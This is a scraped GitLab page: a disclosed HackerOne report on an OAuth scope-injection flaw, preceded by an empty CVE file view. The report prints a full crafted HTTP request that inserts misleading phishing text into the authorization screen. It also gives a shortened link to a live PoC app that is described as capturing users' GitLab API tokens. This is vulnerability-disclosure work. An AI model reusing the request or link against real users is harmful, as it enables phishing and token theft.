=== Content from gitlab.com_1adbb497_20250115_085459.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-39881.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-39881.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-39881.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-39881.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Oct 01, 2021

  [b5b2b9ac](/gitlab-org/cves/-/commit/b5b2b9ac0284b94f9e76c6838d3abf7512ef04d4)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/b5b2b9ac0284b94f9e76c6838d3abf7512ef04d4)
  繚
  b5b2b9ac

  [ GitLab Bot ](/gitlab-bot) authored Oct 01, 2021

  b5b2b9ac

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/b5b2b9ac0284b94f9e76c6838d3abf7512ef04d4)
  [ GitLab Bot ](/gitlab-bot) authored Oct 01, 2021

Loading



=== Content from gitlab.com_1b22e6d1_20250115_085459.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Ability to add your scopes to the app + text injection in OAuth

**[HackerOne report #494530](https://hackerone.com/reports/494530)** by `executor` on 2019-02-11, assigned to `dappelt`:

Hello again! Found that in applications (<https://gitlab.com/profile/applications>) the scope that we pass in the request when creating and editing the application is not checked. It turns out that we can pass your scope, with its text. I decided to try it and I did it!

[![Screenshot_1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/193b77c420adef28a7a73d8fb377d9c9ef6311c0/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3439343533302f3432323038332f53637265656e73686f745f312e706e67)

But it didn't give any strong result..

Then I got the idea, and what if the scope to write the text that it was displayed OAuth authorization

The first problem I encountered was a problem. Any space between the two words shared a single scope on several scopes.

The solution to this problem came almost immediately, I decided to try to replace the space with another space (alt+255 on numpad keyboard)

[![Screenshot_2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/e2a76b04cdca252a132f1731cc47b26b6e920288/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3439343533302f3432323038382f53637265656e73686f745f322e706e67)

Request

```
POST /oauth/applications HTTP/1.1
Host: gitlab.com
Cache-Control: max-age=0
Origin: https://gitlab.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://gitlab.com/profile/applications
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _gitlab_session=session;
Content-Length: 967
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

utf8=%E2%9C%93&authenticity_token=token&doorkeeper_application%5Bname%5D=govon&doorkeeper_application%5Bredirect_uri%5D=http%3A%2F%2Flocalhost&doorkeeper_application%5Bscopes%5D%5B%5D=api&doorkeeper_application%5Bscopes%5D%5B%5D=read_user&doorkeeper_application%5Bscopes%5D%5B%5D=sudo&doorkeeper_application%5Bscopes%5D%5B%5D=read_repository&doorkeeper_application%5Bscopes%5D%5B%5D=read_registry&doorkeeper_application%5Bscopes%5D%5B%5D=After%C2%A0clicking%C2%A0on%C2%A0the%C2%A0%22Authorize%22%C2%A0you%C2%A0will%C2%A0receive%C2%A0a%C2%A0gold%C2%A0tariff&doorkeeper_application%5Bscopes%5D%5B%5D=You%C2%A0will%C2%A0receive%C2%A0the%C2%A0tariff%C2%A0only%C2%A0after%C2%A0clicking%C2%A0on%C2%A0the%C2%A0%22authorize%22&doorkeeper_application%5Bscopes%5D%5B%5D=All%C2%A0rights%C2%A0that%C2%A0you%C2%A0have%C2%A0requested%C2%A0will%C2%A0not%C2%A0be%C2%A0used%C2%A0after%C2%
```

Then I decided to check all this on OAuth authorization

[![Screenshot_3.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/af12a44b4e4e1c27f963af9d00ae70b16f6495c1/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3439343533302f3432323039322f53637265656e73686f745f332e706e67)

Everything works fine, as seen in the screenshot.

Proof of Concept

ATTENTION: This PoC is a real app that will get your GitLab API token if you click Authorize. If you open it, either close the window or click Deny.

```
https://goo.gl/8qTxRE
```

## Impact

Inattentive user can read only the bottom lines and lead to phishing. As a result, we will have a victim token.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_1.png](https://h1.sec.gitlab.net/a/494530/422083/Screenshot_1.png)
* [Screenshot\_2.png](https://h1.sec.gitlab.net/a/494530/422088/Screenshot_2.png)
* [Screenshot\_3.png](https://h1.sec.gitlab.net/a/494530/422092/Screenshot_3.png)

Edited Aug 31, 2021 by [Sam Kerr](/stkerr)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


